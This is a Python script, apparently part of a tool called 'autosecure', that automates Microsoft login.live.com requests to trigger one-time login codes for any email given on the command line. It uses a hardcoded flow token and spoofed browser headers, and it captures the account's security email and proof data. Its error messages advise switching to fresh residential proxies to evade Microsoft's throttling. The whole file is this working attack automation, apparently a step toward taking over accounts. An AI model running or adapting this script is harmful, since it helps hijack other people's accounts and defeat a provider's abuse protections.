#!/usr/bin/env python3
"""
OTP send — port of Sal/autosecure securing/auth/send_auth.py

GetCredentialType → GetOneTimeCode.srf (eOTT_OtcLogin)
ErrorHR 80046703 = MS throttle / bad flow token — retry with Sal's static token.
"""
from __future__ import annotations

import json
import re
import sys
import time

try:
    import httpx
except ImportError:
    print(json.dumps({"ok": False, "error": "httpx not installed — run: pip install httpx"}))
    sys.exit(0)

# Sal autosecure hardcodes this flowToken for GetCredentialType
SAL_FLOW_TOKEN = (
    "-DgAlkPotvHRxxasQViSq!n6!RCUSpfUm9bdVClpM6KR98HGq7plohQHfFANfGn4P7PN2GnUuAtn6Nu3dwU!"
    "Tisic5PrgO7w8Rn*LCKKQhcTDUPMM2QJJdjr4QkcdUXmPnuK!JOqW7GdIx3*icazjg5ZaS8w1ily5GLFRwdvob"
    "IOBDZP11n4dWICmPafkNpj5fKAMg3!ZY2EhKB7pVJ8ir4A$"
)
MSPOK = "MSPOK=$uuid-899fc7db-4aba-4e53-b33b-7b3268c26691"


def get_session() -> httpx.Client:
    return httpx.Client(
        timeout=30.0,
        follow_redirects=True,
        headers={
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
            ),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        },
    )


def get_live_data(session: httpx.Client) -> dict:
    response = session.post("https://login.live.com")
    url_post = re.search(
        r"https://login\.live\.com/ppsecure/post\.srf\?contextid=[0-9a-zA-Z]{1,100}&opid=[0-9a-zA-Z]{1,100}&bk=[a-zA-Z0-9]{1,100}&uaid=[0-9a-zA-Z]{1,100}&pid=0",
        response.text,
    )
    if not url_post:
        url_post = re.search(
            r"https://login\.live\.com/ppsecure/post\.srf\?[^\"'\\\s]+",
            response.text,
        )
    if not url_post:
        raise RuntimeError("Failed to extract urlPost")
    ppft = re.search(r'value=\\?"([^"]+)"', response.text)
    if not ppft:
        ppft = re.search(r'name="PPFT"[^>]*value="([^"]+)"', response.text)
    if not ppft:
        raise RuntimeError("Failed to extract PPFT")
    return {"urlPost": url_post.group(0), "ppft": ppft.group(1)}


def get_credential_type(session: httpx.Client, email: str, flow_token: str) -> dict:
    """Exact Sal autosecure GetCredentialType body (forceotclogin=False)."""
    r = session.post(
        url="https://login.live.com/GetCredentialType.srf",
        headers={
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json; charset=utf-8",
            "Cookie": MSPOK,
            "Referer": "https://login.live.com/",
            "hpgact": "0",
            "hpgid": "33",
        },
        json={
            "checkPhones": True,
            "country": "",
            "federationFlags": 3,
            "flowToken": flow_token,
            "forceotclogin": False,
            "isCookieBannerShown": True,
            "isExternalFederationDisallowed": True,
            "isFederationDisabled": True,
            "isFidoSupported": False,
            "isOtherIdpSupported": False,
            "isReactLoginRequest": True,
            "isRemoteConnectSupported": False,
            "isRemoteNGCSupported": True,
            "isSignup": False,
            "otclogindisallowed": False,
            "username": email,
        },
    )
    try:
        return r.json()
    except Exception:
        return {"_http": r.status_code, "_body": (r.text or "")[:200]}


def post_one_time_code(
    session: httpx.Client,
    email: str,
    flowtoken: str,
    alt_email_e: str,
    security_mail: str,
) -> dict:
    payload = {
        "login": email,
        "flowtoken": flowtoken,
        "purpose": "eOTT_OtcLogin",
        "channel": "Email",
        "ChallengeViewSupported": "1",
        "AltEmailE": alt_email_e,
        "lcid": "1033",
    }
    if security_mail == email:
        payload["purpose"] = "eOTT_NoPasswordAccountLoginCode"

    resp = session.post(
        url="https://login.live.com/GetOneTimeCode.srf?id=38936",
        headers={
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://login.live.com",
            "Referer": "https://login.live.com/",
        },
        data=payload,
    )
    body_text = (resp.text or "")[:300]
    try:
        j = resp.json()
    except Exception:
        return {
            "ok": resp.status_code == 200 and len(body_text) < 5,
            "error": None if resp.status_code == 200 else f"GetOneTimeCode HTTP {resp.status_code}: {body_text}",
            "detail": body_text,
        }

    state = j.get("State") if "State" in j else j.get("state")
    # Sal doesn't check State strictly — any 200 without hard error often means sent
    if resp.status_code == 200:
        if state in (204, "204"):
            return {
                "ok": False,
                "error": "GetOneTimeCode State=204 (MS blocked / bad challenge). Rotate residential proxy.",
                "detail": body_text,
            }
        if state in (200, 201, "200", "201", 0, "0", None):
            err = j.get("Error") or j.get("error") or j.get("ErrorCode")
            if err and str(err) not in ("0", "None", ""):
                return {"ok": False, "error": f"GetOneTimeCode err={err} body={body_text}", "detail": body_text}
            return {"ok": True, "detail": f"State={state} body={body_text[:80]}"}
        return {
            "ok": False,
            "error": f"GetOneTimeCode State={state} body={body_text}",
            "detail": body_text,
        }
    return {"ok": False, "error": f"GetOneTimeCode HTTP {resp.status_code}: {body_text}", "detail": body_text}


def send_auth_and_otp(session: httpx.Client, email: str) -> dict:
    # Warm session cookies
    try:
        live = get_live_data(session)
        live_ppft = live["ppft"]
    except Exception as e:
        live_ppft = ""
        print(f"[send_ott] get_live_data warn: {e}", file=sys.stderr)

    # Try flow tokens in order: Sal static (known working) → live PPFT
    flow_candidates = [SAL_FLOW_TOKEN]
    if live_ppft and live_ppft != SAL_FLOW_TOKEN:
        flow_candidates.append(live_ppft)

    email_info = None
    last_err = ""
    for i, ft in enumerate(flow_candidates):
        email_info = get_credential_type(session, email, ft)
        if "Credentials" in email_info:
            break
        err_hr = str(email_info.get("ErrorHR") or "")
        last_err = err_hr or str(email_info)
        # 80046703 = throttle / invalid — brief pause then next token
        if err_hr.upper() in ("80046703", "0X80046703") or "80046703" in err_hr:
            time.sleep(1.5)
            continue
        time.sleep(0.5)

    if not email_info or "Credentials" not in email_info:
        err_hr = ""
        if isinstance(email_info, dict):
            err_hr = str(email_info.get("ErrorHR") or "")
        msg = "Microsoft GetCredentialType failed"
        if err_hr:
            msg += f" (ErrorHR={err_hr})"
        if "80046703" in (err_hr or last_err):
            msg += (
                " — IP/rate limited by Microsoft. Wait 15–30 min or use a fresh residential proxy sticky."
            )
        return {"ok": False, "error": msg, "raw": email_info}

    creds = email_info["Credentials"]

    if creds.get("RemoteNgcParams"):
        return {"ok": False, "error": "Authenticator-only account (not supported yet)"}

    proofs = creds.get("OtcLoginEligibleProofs") or []
    if not proofs:
        pref = creds.get("PrefCredential")
        return {
            "ok": False,
            "error": f"No email OTP proofs (PrefCredential={pref}). Account may require password login only.",
        }

    selected = proofs[0]
    alt_email_e = selected.get("data") or ""
    security_mail = selected.get("display") or "unknown"
    if not alt_email_e:
        return {"ok": False, "error": "Empty proof data from OtcLoginEligibleProofs"}

    # Fresh PPFT for GetOneTimeCode (Sal does livedata again before OTC)
    try:
        live2 = get_live_data(session)
        flowtoken = live2["ppft"]
    except Exception:
        flowtoken = live_ppft or SAL_FLOW_TOKEN

    otc = post_one_time_code(session, email, flowtoken, alt_email_e, security_mail)
    if otc.get("ok"):
        return {
            "ok": True,
            "securityEmail": security_mail,
            "proofId": alt_email_e,
            "ppft": flowtoken,
            "detail": otc.get("detail"),
        }

    # Retry GetOneTimeCode once with Sal static flowtoken
    if flowtoken != SAL_FLOW_TOKEN:
        otc2 = post_one_time_code(session, email, SAL_FLOW_TOKEN, alt_email_e, security_mail)
        if otc2.get("ok"):
            return {
                "ok": True,
                "securityEmail": security_mail,
                "proofId": alt_email_e,
                "ppft": SAL_FLOW_TOKEN,
                "detail": otc2.get("detail"),
            }
        otc = otc2

    return {
        "ok": False,
        "error": otc.get("error") or "GetOneTimeCode failed",
        "securityEmail": security_mail,
        "proofId": alt_email_e,
    }


def main() -> None:
    if len(sys.argv) < 2:
        print(json.dumps({"ok": False, "error": "usage: send_ott.py <email>"}))
        return
    email = sys.argv[1].strip()
    try:
        with get_session() as session:
            result = send_auth_and_otp(session, email)
            print(json.dumps(result))
    except Exception as e:
        print(json.dumps({"ok": False, "error": str(e)}))


if __name__ == "__main__":
    main()
